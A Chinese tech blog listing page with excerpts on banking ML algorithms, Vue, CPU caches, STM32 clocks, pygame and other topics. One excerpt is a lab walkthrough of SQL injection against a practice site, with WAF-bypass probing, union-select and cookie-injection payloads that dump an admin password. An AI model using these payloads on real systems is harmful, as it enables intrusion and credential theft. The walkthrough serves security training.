⑤时间序列分析算法：如ARIMA和指数平滑等，这些算法可以帮助银行预测销售量和市场需求，以便更有效地管理库存和供应链。
⑥协同过滤算法：这种算法通过分析客户的历史行为和其他客户的行为模式，来预测目标客户可能感兴趣的产品或服务。
五、信用评分 信用评分即通过分析客户的信用历史、财务状况等，给客户打分，以决定是否授予贷款以及贷款的利率。主要有以下几类算法：
①逻辑回归：这是一种广泛应用于信用评分的二元分类算法。它通过分析客户的历史行为和其他相关属性，预测客户的违约概率。
②决策树和随机森林：这些算法可以用于处理缺失值，并且能够对客户进行分群，从而为不同类型的客户制定合适的信用评分策略。
③WOE编码：通过对原始变量进行WOE编码，可以帮助银行对不同类型的客户进行更精确的信用评分。
④SMOTE算法：这是一种解决类别不平衡问题的算法，在信用评分中有着广泛的应用。通过使用SMOTE算法，银行可以更准确地预测客户的违约风险。
⑤特征选择和建模分析：这个过程包括IV值、相关系数和显著性的筛选，以及使用逻辑回归算法解决二元分类问题（判定贷款申请人是否违约），最终计算出每个样本的信用评分。
六、客户流失预测 即通过分析客户的行为模式，预测哪些客户可能会流失，以便采取措施挽留他们。主要有以下
①逻辑回归（Logistic Regression）：逻辑回归是一种常用的分类算法，可以用于预测一个事件的发生概率，例如预测客户是否会流失。。这是一种广泛应用于信用评分和客户流失预测的二元分类算法。它通过分析客户的历史行为和其他相关属性，预测客户的流失概率。
②决策树和随机森林：这些算法可以处理缺失值，并且能够对客户进行分群，从而为不同类型的客户制定合适的挽留策略。
③支持向量机（SVM）：SVM是一种监督学习模型，主要用于分类和回归分析。
④神经网络（Neural Networks）：神经网络是一种模仿人脑神经元工作的模型，可以用于模式识别、时间序列预测等。
⑤K-Means聚类算法：K-Means聚类算法是一种常用的无监督学习算法，用于将客户划分为不同的群体。这种方法计算量比较小，适用于大数据。
⑥XGBoost算法：这是一种优化的决策树算法，被广泛应用在客户流失预测中。XGBoost有一个很有用的函数“cv”，这个函数可以在每一次迭代中使用交叉验证，并返回理想的决策树数量。
⑦Bagging算法：通过结合多个决策树的预测结果来提高模型的准确性和稳定性，有效预测客户的流失情况。
七、推荐引擎 在任何行业中成功的关键是向他们真正想要的用户提供这些选定的商品和服务。通过分析客户活动，不同的数据分析和机器学习工具可以帮助行业确定最适合客户的项目。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/570c7167f759820e1ac39882f4e696a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2afa589b9343f03a8f8f16e446419d3/" rel="bookmark">
			Vue2 基本语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue2 基本语法 前言Vue2 基本语法脚手架文件结构关于不同版本的Vuevue.config.js配置文件ref属性props配置项mixin(混入)插件scoped样式总结TodoList案例webStorage组件的自定义事件全局事件总线（GlobalEventBus）消息订阅与发布（pubsub）nextTickVue封装的过度与动画vue脚手架配置代理方法一方法二 插槽Vuex1.概念2.何时使用？3.搭建vuex环境4.基本使用5.getters的使用6.四个map方法的使用7.模块化+命名空间 路由1.基本使用2.几个注意点3.多级路由（多级路由）4.路由的query参数5.命名路由6.路由的params参数7.路由的props配置8.```&lt;router-link&gt;```的replace属性9.编程式路由导航10.缓存路由组件11.两个新的生命周期钩子12.路由守卫13.路由器的两种工作模式 前言 内容来自bilibili尚硅谷视频笔记，记录一下，方便后续查阅
Vue2 基本语法 脚手架文件结构 ├── node_modules ├── public │ ├── favicon.ico: 页签图标 │ └── index.html: 主页面 ├── src │ ├── assets: 存放静态资源 │ │ └── logo.png │ │── component: 存放组件 │ │ └── HelloWorld.vue │ │── App.vue: 汇总所有组件 │ │── main.js: 入口文件 ├── .gitignore: git版本管制忽略的配置 ├── babel.config.js: babel的配置文件 ├── package.json: 应用包配置文件 ├── README.md: 应用描述文件 ├── package-lock.json：包版本控制文件 关于不同版本的Vue vue.js与vue.runtime.xxx.js的区别： vue.js是完整版的Vue，包含：核心功能 + 模板解析器。vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。 vue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2afa589b9343f03a8f8f16e446419d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9057fbb55daced5173fd8f9c4cca89ed/" rel="bookmark">
			Vue3 快速上手-基于Vue2基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue3 快速上手-基于Vue2基础 前言Vue3快速上手1.Vue3简介2.Vue3带来了什么1.性能的提升2.源码的升级3.拥抱TypeScript4.新的特性 一、创建Vue3.0工程1.使用 vue-cli 创建2.使用 vite 创建 二、常用 Composition API1.拉开序幕的setup2.ref函数3.reactive函数4.Vue3.0中的响应式原理vue2.x的响应式Vue3.0的响应式 5.reactive对比ref6.setup的两个注意点7.计算属性与监视1.computed函数2.watch函数3.watchEffect函数 8.生命周期9.自定义hook函数10.toRef 三、其它 Composition API1.shallowReactive 与 shallowRef2.readonly 与 shallowReadonly3.toRaw 与 markRaw4.customRef5.provide 与 inject6.响应式数据的判断 四、Composition API 的优势1.Options API 存在的问题2.Composition API 的优势 五、新的组件1.Fragment2.Teleport3.Suspense 六、其他1.全局API的转移2.其他改变 前言 内容来自于bilibili尚硅谷视频笔记，记录一下，方便查阅
Vue3快速上手 1.Vue3简介 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）耗时2年多、2600+次提交、30+个RFC、600+次PR、99位贡献者github上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0 2.Vue3带来了什么 1.性能的提升 打包大小减少41%
初次渲染快55%, 更新渲染快133%
内存减少54%
…
2.源码的升级 使用Proxy代替defineProperty实现响应式
重写虚拟DOM的实现和Tree-Shaking
…
3.拥抱TypeScript Vue3可以更好的支持TypeScript 4.新的特性 Composition API（组合API）
setup配置ref与reactivewatch与watchEffectprovide与inject… 新的内置组件
FragmentTeleportSuspense 其他改变
新的生命周期钩子data 选项应始终被声明为一个函数移除keyCode支持作为 v-on 的修饰符… 一、创建Vue3.0工程 1.使用 vue-cli 创建 官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create
## 查看@vue/cli版本，确保@vue/cli版本在4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9057fbb55daced5173fd8f9c4cca89ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2344ccbcfe21c1d76b2ff98446e51875/" rel="bookmark">
			寄存器、缓存、内存之间的关系和区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/m0_46761060/article/details/124689209
目录 关系1、寄存器2、缓存（Cache） 2.1、寄存器和缓存的区别2.2、一级缓存和二级缓存3、内存 3.1、只读存储器 ROM（Read Only Memory）3.2、随机存储器 RAM（Random Access Memory） 3.2.1、静态RAM（Static RAM/SRAM）3.2.2、动态RAM（Dynamic RAM/DRAM） 关系 1、寄存器 寄存器（register）是CPU（中央处理器）的组成部分，是一种直接整合到cpu中的有限的高速访问速度的存储器，它是有一些与非门组合组成的，分为通用寄存器和特殊寄存器。cpu访问寄存器的速度是最快的。那为什么我们不把数据都存储到寄存器中呢，因为寄存器是一种容量有限的存储器，并且非常小。因此只把一些计算机的指令等一些计算机频繁用到的数据存储在其中，来提高计算机的运行速度。
2、缓存（Cache） 缓存就是数据交换的缓冲区（称作Cache），当某一硬件要读取数据时，会首先从缓存中查找需要的数据，如果找到了则直接执行，找不到的话则从内存中找。由于缓存的运行速度比内存快得多，故缓存的作用就是帮助硬件更快地运行。
因为缓存往往使用的是RAM（断电即掉的非永久储存），所以在用完后还是会把文件送到硬盘等存储器里永久存储。电脑里最大的缓存就是内存条了，最快的是CPU上镶的L1和L2缓存，显卡的显存是给显卡运算芯片用的缓存，硬盘上也有16M或者32M的缓存。
CACHE是在CPU中速度非常块，而容量却很小的一种存储器，它是计算机存储器中最强悍的存储器。由于技术限制，容量很难提升。
对于大多数人来说Cache，是透明的、不存在的。其中一个原因是Cache是集成到CPU中，对于程序员来说是透明的。
2.1、寄存器和缓存的区别 按与CPU远近来分，离得最近的是寄存器，然后缓存，最后内存。所以，寄存器是最贴近CPU的，而且CPU只与寄存器中进行存取。寄存器从内存中读取数据，但由于寄存器和内存读取速度相差太大，所以有了缓存。即读取数据的方式为：
CPU &lt;------&gt;寄存器 &lt;----&gt;缓存&lt;-----&gt;内存
当寄存器没有从缓存中读取到数据时，也就是没有命中，那么就从内存中读取数据。
2.2、一级缓存和二级缓存 CPU读取数据的顺序为先缓存后内存。
CPU内部集成的缓存称为一级缓存(L1 Cache)，外部的称为二级缓存(L2 Cache)。
一级缓存中又分为数据缓存(D-Cache)和指令缓存(I-Cache)。二者可以同时被CPU进行访问，减少了争用Cache所造成的冲突，提高了CPU的效能。
CPU的一级缓存通常都是静态RAM（Static RAM/SRAM），速度非常快，但是贵。
为提高系统的性能和速度又必须扩大缓存，所以在不扩大原来的静态RAM缓存容量的情况下，仅仅增加一些高速动态RAM(Dynamic RAM/DRAM)做为L2级缓存。高速动态RAM速度要比常规动态RAM快，但比原来的静态RAM缓存慢，而且成本也较为适中。一级缓存和二级缓存中的内容都是内存中访问频率高的数据的复制品（映射)，它们的存在都是为了减少高速CPU对慢速内存的访问。
二级缓存是CPU性能表现的关键之一，在CPU核心不变化的情况下，增加二级缓存容量能使性能大幅度提高。而同一核心的CPU高低端之分往往也是在二级缓存上存在差异.
CPU在缓存中找到有用的数据被称为命中，当缓存中没有CPU所需的数据时(这时称为未命中)，CPU才访问内存。从理论上讲，在一颗拥有二级缓存的CPU中，读取一级缓存的命中率为80%。也就是说CPU一级缓存中找到的有用数据占数据总量的80%，剩下的20%从二级缓存中读取。由于不能准确预测将要执行的数据，读取二级缓存的命中率也在80%左右(从二级缓存读到有用的数据占总数据的16%)。那么还有的数据就不得不从内存调用，但这已经是一个相当小的比例了。
在较高端CPU中，还会带有三级缓存，它是为读取二级缓存后未命中的数据设计的一种缓存，在拥有三级缓存的CPU中，只有约5%的数据需要从内存中调用，这进一步提高了CPU的效率，从某种意义上说，预取效率的提高，大大降低了生产成本却提供了非常接近理想状态的性能。
3、内存 ROM在系统停止供电的时候仍然可以保持数据，而RAM通常都是在掉电之后就丢失数据，典型的RAM就是计算机的内存。
3.1、只读存储器 ROM（Read Only Memory） PROM是可编程的ROM，PROM和EPROM（可擦除可编程ROM）两者区别是，PROM是一次性的，也就是软件灌入后，就无法修改了，现在已经不可能使用了，而EPROM是通过紫外光的照射擦除原先的程序，是一种通用的存储器。另外一种EEPROM是通过电子擦除，价格很高，写入时间很长，写入很慢。
3.2、随机存储器 RAM（Random Access Memory） 3.2.1、静态RAM（Static RAM/SRAM） 当数据被存入其中后不会消失。SRAM速度非常快，是目前读写最快的存储设备。当这个SRAM 单元被赋予0 或者1 的状态之后，它会保持这个状态直到下次被赋予新的状态或者断电之后才会更改或者消失。需要4-6 只晶体管实现， 价格昂贵。
3.2.2、动态RAM（Dynamic RAM/DRAM） DRAM 必须在一定的时间内不停的刷新才能保持其中存储的数据。DRAM 只要1 只晶体管就可以实现。
DRAM保留数据的时间很短，速度也比SRAM慢，不过它还是比任何的ROM都要快，但从价格上来说DRAM相比SRAM要便宜很 多，计算机内存就是DRAM的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5159aeb71f5e20712dd58291b0723160/" rel="bookmark">
			解决tar (child): bzip2：无法 exec: 没有那个文件或目录/tar (child): Error is not recoverable: exiting now
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
[zl@vircent7 ~]$ tar -jxvf atdir.tar.bz2 -C btdir/
tar (child): bzip2：无法 exec: 没有那个文件或目录
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now
解决方法：
1、切换到root用户
[long@vircent7 ~]$ su -
密码：
上一次登录：二 11月 21 06:02:14 CST 2023pts/9 上
[root@vircent7 ~]#
2、安装zip和unzip
[root@localhost ~]# yum install -y zip
[root@localhost ~]# yum install -y unzip 3、重新打包
[zl@vircent7 ~]$ tar -jcvf atdir.tar.bz2 atdir/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5159aeb71f5e20712dd58291b0723160/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0766ccbb46281c2dc526763539e15876/" rel="bookmark">
			某次训练yolov5时速度突然很慢，gpu_mem一直为0，原因竟是！！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		某次我像往常一样训练yolov5算法，但是发现训练速度变得超级无敌慢，仔细一看，gpu_mem为0，也就是没有调用gpu来训练，看来原因就出在这里。
用了好多方法后发现，我竟然没有激活conda环境，低级错误好致命。
激活后就好了。 yolov5是我自己给我的conda环境起的名字。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27ca472beba2a8e63e3f61dc8a163cde/" rel="bookmark">
			STM32：时钟树原理概要
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在一般情况下只要在CubeIDE中将RCC下的高速时钟源设置成晶振，随后在时钟配置中把HCLK设置到最大频率（比如STM32F103的最高频率是72MHZ ），CubeIDE就会帮我们自动调节其它参数到合适的值。这样我们芯片就可以全速运行了。
一、时钟信号 芯片大部分都是由庞大的电路组成。这种电路通常是逻辑电路。例如如下电路：
AB线路分别输入 0 和 1 后经过与门和异或门，在寄存器存的值便是 1。此时AB线路再分别输入1和1，在理想状态下寄存器值就会变成0。但是实际和理想情况不同。
在现实实践中，存在门电路运算延时问题。在AB线路分别输入1和1的时候，由于与门运算电路比较复杂，门电路运算相比其他简单线路传输时间就更长。在异或门下端输入到高电平时，上端还保留上次与门运算的输出结果，此时就会处于一种由延迟造成的错误状态。处在这种错误状态时间虽然短暂，但是依赖于这种电路组成的复杂系统可能会在不可预知的时间内发生不可预知的错误。
为了解决这种延迟问题可以在电路中引入边沿触发器。边沿触发器中包含一个输入端(D)，输出端（Q），和控制端(CLK).边沿触发器的特性：将一个固定频率的信号不断发送到控制端中。在控制端出现一个从低电平到高电平的上升沿信号时，才会将输入结果从输出端输出。电路修正为如下图所示，这种固定频率的方波信号，可以在一个完整周期内保证寄存器的值都不会改变，解决了电路运算延时问题。这种方波信号就是时钟信号。
时钟信号由单片机“心脏”时钟源产生，通过“动脉”时钟树传播到整个芯片电路中。
二、HCLK 时钟树 在STM32内部有一个叫做先进高性能总线（Advance High Performance Bus，AHB）总线。它就是STM32的主干道。STM32芯片中的处理器，内存，DMA，以及各种外设都连接到这一总线上。
HCLK属于AHB总线中的时钟线。它直接连接了处理器，内存，DMA。为他们带去了时钟信号。在处理器内核中有一个成为 SysTick(系统滴答)的定时器，为我们的程序提供一个时钟基准(HAL_DELAY()函数就是依赖于SysTick）。与直连不同，SysTick和AHB之间连接了一个分频器
分频器的作用是变频,降低频率。即给频率作除法。例如将分频器设置为"/8"也就是变成原来频率的1/8。连接SysTick的分频器可以设置“/1”和“/8”。例如AHB提供72MHZ的频率经过"/8"的分频器后就会变成9MHZ。
在STM32芯片中，像GPIO，串口，IIC等外设并没有直接连接到AHB总线上。而是两个先进外设总线（Advance Peripheral Bus，APB）分别连接到AHB上。外设通过一种桥接器连接到APB进行处理。让外设和AHB直连的部件进行间接通信。 APB1上连接了串口2到5，SPI2/3.IIC，USD，CAN，通用定时器，基本定时器等等；APB2上连接了ADC，串口1，SPI1，高级定时器TIM1和TIM8，所有GPIO口和中断等。
在APB1和AHB中间有一个也有一个分频器，此分频器输出的信号称作PCLK。分频器与定时器之间还连接一个倍频器。倍频器与分频器的功能相反，用来给频率作乘法。例如提供32MHZ的频率经过"x2"的倍频器后就会变成72MHZ。
注：在《STM32官方参考手册》中的第2章存储器和总线构架中可以了解具体AHB总线的结构。
把上图简化成树形结构如下图HCLK的右半部分所示结构。只要设置HCLK频率再调节变频器和倍频器就可以将想要的时钟频率输出给其他部件。
从“源头”来讲，提供给HCLK的时钟源有两个，HSI高速内部时钟和HSE高速外部时钟。其中HSI是STM32的默认时钟源，它内置在芯片内部，无需外接电路，产生的频率为8MHZ。高速外部时钟HSE需要从外部电路接入一种叫做“晶振”的器件，该器件内部有石英晶体可以发出一定频率的脉冲信号，其脉冲精度要比HSI好得多。
PLLCLK锁相环时钟，它起到的作用是倍频器作用，它可以选择将HSI或者HSE的时钟分频后的信号选择一个再进行倍频输出。因此进入系统时钟SysCLK就可以有三种输入选择：HSI，HSE,PLL锁相环。再经过AHB分频器就到了HCLK部件了。
三、时钟配置补充 FCLK，自由运行时钟：当我们需要节省电量需要STM32进行低功耗模式之一的“停止模式”时，AHB总线会停止运行，HCLK会停止传输时钟脉冲，所有连接到AHB总线上的外设都会停止运行。FCLK实际上连接是AHB分频器,当STM32处于休眠状态是，FCLK依旧处于运行态，为中断采样提供时钟信号To FLITFCLK:为Flash编程接口的时钟，它的时钟源永远来自于HSI。 To USB:为USD功能提供的系统时钟，来自于PLL锁相环。Clock Security System，CSS时钟安全系统：原始时钟源为HSE或为倍频过的HSE可选择开启。它可以在HSE发生故障时，立即将时钟源切换为HSI，并且产生中断。RTC/看门狗时钟树：一个独立的时钟树，时钟源是低速内部时钟LSI和低速外部时钟LSE，或者高速外部时钟的“/128”分频。挂在上面的是RTC实时时钟和看门狗。Master Clock Output,时钟输出功能：在基本设置-&gt;System Core-&gt;RCC 界面中勾选Master Clock Output 就可以使用该功能。PA8引脚就会被设置为RCC_MCO。在根据时钟配置界面中选择其中一个时钟信号输出，PA8就可以获取到数据 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dd6c15331f3fdff560c71a98c7a4b24/" rel="bookmark">
			小诺2.0开源版工程启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小诺是一款开源的前后端开发框架，同若依、SpringBladex一样可作为私活、外包脚手架。
开源地址：Snowy: 最新：💖国内首个国密前后分离快速开发平台💖，采用Vue3+AntDesignVue3 + Vite+SpringBoot+Mp+HuTool+SaToken。集成国密加解密插件，在前后分离框架中，实现前后分离“密”不可分；同时实现国产化机型、中间件、数据库适配，是您的不二之选；最后官网提供工作流、多租户、多数据源、Vue3表单设计器等丰富插件灵活使用。
官网文档介绍关于启动的内容较少，视频教程也是边熟悉便教学，会有后面推翻前面结论的情况。。。。
简单介绍一下启动
在IDE里启动工程建议电脑最低内存配置16G，不在IDE里启动工程建议电脑最低内存配置8G
一、前后端使用版本 后端JDK8
前端node16.x 不要用18 20的lts版，坑太多
建议使用以下命令锁定版本，防止遗忘。
node -v &gt;.nvmrc
文件转为utf8 无bom编码，便于其他工具打包识别版本使用。阿里云云效就对这个要求严格
二、各工程作用和端口 后端可启动工程
SnowyActuatorApp boot-admin监控用的
SnowyBizApp 业务都写在这
SnowyNacosApp nacos注册中心+配置中心（现在用的2.1.2GA的源码）
SnowyGatewayApp 路径转发映射到服务用的
SnowySentinelApp 熔断限流降级用的
SnowyWebApp 主工程APP
SnowyXxlJobApp 定时任务用的
各工程默认端口
前端 9000
SnowyActuatorApp 9001
SnowyBizApp 9102
SnowyNacosApp 8848
SnowyGatewayApp 9003
SnowySentinelApp 9002
SnowyWebApp 9101
SnowyXxlJobApp 9004
项目里 snowy-admin-web 是前端文件夹，其他的都是后端文件。
三、启动工程前的初始化 1.nacos初始化
新建nacos数据库 名为snowy-nacos-app
导入nacos数据库脚本 snowy-server/snowy-nacos-app/src/main/resources/META-INF/nacos-db.sql
导入命名空间和命名空间配置文件
sql导入 snowy-server/snowy-nacos-app/src/main/resources/META-INF/update/nacos-db-update-20230611.sql
修改snowy-server/snowy-nacos-app/src/main/resources/application.properties
改数据库密码后可启动SnowyNacosApp
2.系统数据库初始化
新建数据库 snowy-cloud
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dd6c15331f3fdff560c71a98c7a4b24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d47214ab01a82c7f0541a171e3602103/" rel="bookmark">
			pygame播放视频并实现音视频同步
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言
在我接触pygame时最新的pygame已经不支持movie模块，这就导致在pygame播放视频变成一个问题，网上搜了下解决方案有两个：
一是使用opencv播放视频，再结合pygame.mixer来播放音频
二是使用moviepy播放视频，再结合pygame.mixer播放音频
上述两个方案其实都是先将mp4的视频分离成“画面帧”和“mp3音频”，所谓的播放实际上是不停地在切换“画面帧”，同时播放音频，最终实现音视频的同时播放。
但上述两个方案都存在“音画同步”的问题，因为无论是opencv还是moviepy都只负责将视频切片成帧，播放则是pygame自己在执行一个while循环来不停切换界面上展示出来的图片帧，这也就导致while循环很快就将帧播放完毕，而音频则还按着原有节奏缓慢播放。
解决是在while循环中加入合适的延时同时根据当前视频播放进度来设置音频的播放起点以实现同步，但这个方案据我实践在加入延时后就实现了较好的音画同步效果不知道为啥还要去设置音频的播放起点，另外在设置音频播放起点时一直提示错误也不知道为何，所以我这里提供两个方案：
方案一：在while循环中加入延时，短视频测试效果还行
方案二：根据音频的播放节奏来决定视频帧的播放节奏，这样音画肯定是同步的
我选择使用moviepy来做，因为moviepy从mp4中分离mp3比较简单。
二、方案一
在项目的目录下新建videos目录，并放入一个测试使用的mp4文件test.mp4
上述代码实际上是将整个游戏的帧率设置成与视频一致，这样可能存在一些隐患（直觉）。
三、方案二
代码如下：
上述代码的逻辑如下：
1、通过“pygame.mixer.music.get_pos()”获取当前音频的播放进度
2、通过音频播放进度除以视频的总时长，得到音频播放的百分比进度（音画同步的话，音频百分比进度就应该跟视频百分比进度一致）
3、百分比进度乘以视频总帧数可得到当前应当播放哪一个视频帧
4、再判断一下当前实际播放的帧是否已超过了理论应该播放的视频帧（是的话就跳过当前帧的播放）
注意音频播放结束或视频帧播放结束都要结束视频的播放。
四、总结
本篇提供了pygame播放视频的两个方案，第一个方案是网上找的现成的，第二个方案则是参考了opencv（主流方案）自己逆向思维做的，还未经过实际验证。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e909604496b908f459341b01aad5db3/" rel="bookmark">
			封神台第二关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击传送门
来到目标公司网站
可以看到有很多的网页
现在我们需要寻找注入点，注入点存在的页面一般可以明显的显示出正确页面和错误页面
这里可以看到有新闻页面
有新闻的一般选择新闻页面
我们点击第一个新闻
进来后可以看到
URL为
http://g8wepfcp.ia.aqlab.cn/shownews.asp?id=171
开始试探 （1）判断waf拦截的关键字
'触发waf
and触发waf
or触发waf
select触发waf
union order by不会触发waf
--+不能被数据库识别，要使用#
（2）联合查询注入尝试
得到注入点数量，构建联合查询语句
?id=171 union select 1,2,3,4,5,6,7,8,9,10#
利用SQL绕过手法使得select可用
试图转码绕过失败
试图利用/**/和/*!*/绕过失败
放弃联合查询
（3）cookies绕过尝试
尝试cookies绕过
直接访问http://g8wepfcp.ia.aqlab.cn/shownews.asp
利用bp抓包，将原cookies值
Cookie: ASPSESSIONIDACQTQQAS=OKOJFAODPDJCCFEKBAECGJDK
改为
Cookie: id=171
访问网页，发现访问的页面正常输出，cookies可以当值来用
将值改为联合查询语句
并猜测表admin的存在性
Cookie: id=171+union+select+1,2,3,4,5,6,7,8,9,10+from+admin
页面返回正常，说明admin表存在
且页面返回的字段有2,3,7,8,9
这时可以将注入点2,3,7,8,9替换为字段名，用这种方式来猜测字段的存在，并体现返回值
Cookie: id=171+union+select+1,username,password,4,5,6,7,8,9,10+from+admin
页面返回
username：admin
password：b9a2a2b5dffb918c
利用bp解码后
password为welcome
利用御剑后台扫描工具
得到后台网站
http://g8wepfcp.ia.aqlab.cn/admin/Login.asp
输入账户密码
成功通过
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5df0e27e940cb50d32341352914e991/" rel="bookmark">
			Java开发中有用的笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记 一、lambda表达式 1. ::和-&gt;是什么 “::” 和 “-&gt;” 都是Java 8中引入的Lambda表达式的一部分，用于简化代码和增强语言的函数式编程能力。
“::” 符号通常称为“方法引用”，用于引用已有的方法或构造函数，并将其作为Lambda表达式的参数。具体来说，方法引用可以将方法名和参数列表与类或对象的名称分开，以简化代码和提高可读性。方法引用的形式有以下几种：
引用静态方法：ClassName::staticMethodName (x) -&gt; ClassName.staticMethodName(x) 可以使用静态方法引用的方式进行简化：
ClassName::staticMethodName 引用实例方法：instanceName::methodName (x) -&gt; instanceName.methodName(x) 可以使用实例方法引用的方式进行简化：
instanceName::methodName 引用构造函数：ClassName::new () -&gt; new ClassName() 可以使用构造函数引用的方式进行简化：
ClassName::new “-&gt;” 符号通常称为“Lambda箭头”，用于定义Lambda表达式的语法结构。具体来说，Lambda表达式由参数列表、箭头符号和表达式组成，例如： (x, y) -&gt; x + y 其中，参数列表指定Lambda表达式的参数，箭头符号 “-&gt;” 分隔参数列表和表达式，表达式则指定Lambda表达式要执行的操作。
(x, y) -&gt; { int sum = x + y; System.out.println(sum); } 可以理解为：
参数列表为 (x, y)箭头符号 “-&gt;” 分隔参数列表和表达式表达式为 { int sum = x + y; System.out.println(sum); } 需要注意的是，Lambda表达式和方法引用的使用都需要在Java 8及以上版本中才能实现。同时，还需要根据具体情况进行Lambda表达式的编写和调用，以确保代码的正确性和可读性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5df0e27e940cb50d32341352914e991/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c59883ef2654cb9f0d0f1d3659a94da/" rel="bookmark">
			docker安装gitlab 并dump出表结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 docker-compose docker compose up -dversion: '3.6' services: web: image: 'gitlab/gitlab-ce:latest' restart: always hostname: 'localhost' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://localhost:8929' gitlab_rails['gitlab_shell_ssh_port'] = 2224 ports: - '8929:8929' - '2224:22' volumes: #- '$GITLAB_HOME/config:/etc/gitlab' #- '$GITLAB_HOME/logs:/var/log/gitlab' #- '$GITLAB_HOME/data:/var/opt/gitlab' - '/Users/yanlp/workspace/docker/gitlab_latest/config:/etc/gitlab' - '/Users/yanlp/workspace/docker/gitlab_latest/logs:/var/log/gitlab' - '/Users/yanlp/workspace/docker/gitlab_latest/data:/var/opt/gitlab' shm_size: '256m' 登陆容器 docker ps -a docker exec -it 2d9f11bc4619 /bin/bash执行gitlab-rails dbconsole导出 gitlabhq_production=&gt; \! pg_dump -U gitlab -d gitlabhq_production -s &gt; /tmp/all.sql 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9faa983e56c5b90d77b1097eb080a525/" rel="bookmark">
			工具使用篇（1）--快速将网页接口url及参数设置到postman来调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面我分享一下我日常开发中经常使用的工具PostMan，更好的提高我们的开发与排查问题的效率。
一、PostMan介绍： 以下是来自官网的介绍，可以看出Postman是一个用于构建和使用API的API平台，并且简化了很多流程让我更好的创建API。
页面功能：
下面我们来看一下他的整体页面。
可以看到大体有几个分区：api历史调用区、要请求的API及请求、API参数配置、API请求响应的结果。
页面流程非常清晰，“填写要请求的API请求方式及URL --&gt; 配置API参数 --&gt; 点击send按键 --&gt; 获取接口响应结果”执行这个简单流程即可调用API接口调试。
二、实战：快速从页面获取接口放置在PostMan方便调试排查接口问题 （1）从页面捞下来接口cURL：
打开页面调试接口（按F12），点Network页面，找到对应的接口。
点击右键，获取cURL命令。
（2）导入cURL命到PostMan：
点击PostMan中File -&gt; Import（或者Ctrl+O）
粘贴刚刚拷贝的cURL命令
等待一会，就能得到整理好的API接口信息
（3）修改参数即可进行调试：
备注：
（1）cURL介绍：
cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。
cURL支持的通信协议有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。
cURL还支持SSL认证、HTTP POST、HTTP PUT、FTP上传, HTTP form based upload、proxies、HTTP/2、cookies、用户名+密码认证(Basic, Plain, Digest, CRAM-MD5, NTLM, Negotiate and Kerberos)、file transfer resume、proxy tunneling。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bb796577aea6ec4d265515361c23e9b/" rel="bookmark">
			Ajax基础（应用场景｜jquery实现Ajax｜注意事项｜Ajax发送json数据｜Ajax携带文件数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
